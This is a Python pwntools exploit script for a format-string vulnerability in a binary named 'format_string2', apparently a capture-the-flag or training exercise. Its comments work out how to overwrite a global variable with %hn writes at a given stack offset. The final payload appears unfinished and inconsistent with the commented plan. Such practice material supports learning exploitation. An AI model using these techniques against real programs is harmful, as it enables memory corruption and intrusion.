#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("format_string2")

gs = '''
b *main+55
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

io = start()

# sus has to be the value 0x67616c66 (1734437990 in decimal)
# the addr of sus is 0x404060
# since we have to write the lesser value on the higher order bytes we have to write them first 0x6c66 > 0x6761
# this is because %n uses the number of bytes sent so far, which is increasing (hard to explain in text)

# lower order:  \x60\x40\x40 have to write 0x6c66 = 27750 in decimal
# higher order: \x62\x40\x40 have to write 0x6761 = 26465 in decimal

# since we have the same vuln as with the cryptocat exercise, we can use that

# our input is read to the 14th place on the stack
#payload format: "\x12\xc0\x04\x08\x10\xc0\x04\x08%<val1>x%4$hn%<val2>x%5$hn"

# 1734437990 - 3 = 1734437987
#payload = "\x60\x40\x40%1734437987x%14$n"

# 26465 - 16 = 26449 (-16 bytes was for the address we already wrote)
# 27750 - 26465 (total bytes so far) = 1285
#payload = b"\x62\x40\x40\x00\x00\x00\x00\x00\x60\x40\x40\x00\x00\x00\x00\x00%26449llx%19$hn%1285llx%20$hn"
payload = b"%26464d,%20$nlx%,%20$llx,%21$llx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00,AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#payload = b"%26464d,%20$nlx,%20$llx, %21$llx%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00,ABCDEFGHIJKLMNOPQRSTUVWXYZ"
io.sendlineafter(b"What do you have to say?\n", payload)
io.interactive()
